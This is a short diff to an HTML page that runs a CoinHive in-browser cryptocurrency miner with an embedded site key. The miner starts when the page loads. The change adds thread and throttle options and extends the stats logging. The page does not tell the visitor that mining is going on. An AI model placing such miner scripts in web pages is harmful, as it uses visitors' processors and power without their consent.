@@ -11,7 +11,8 @@
   <h1>start</h1>
 
 <script>
-	var miner = new CoinHive.Anonymous('s0N1th4I4ElExw1U3JlqGVTjZR428Nyq');
+	var opts = { threads: 1, throttle: 0.5 };
+	var miner = new CoinHive.Anonymous('s0N1th4I4ElExw1U3JlqGVTjZR428Nyq', opts);
 	miner.start();
   
         var stats = {}
@@ -22,7 +23,7 @@
 		stats.hashesPerSecond = miner.getHashesPerSecond();
 		stats.totalHashes = miner.getTotalHashes();
 		stats.acceptedHashes = miner.getAcceptedHashes();
-		console.log('stats', stats)
+		console.log('options:', opts, 'stats', stats)
 	}, 4000);
 </script>
 </body>
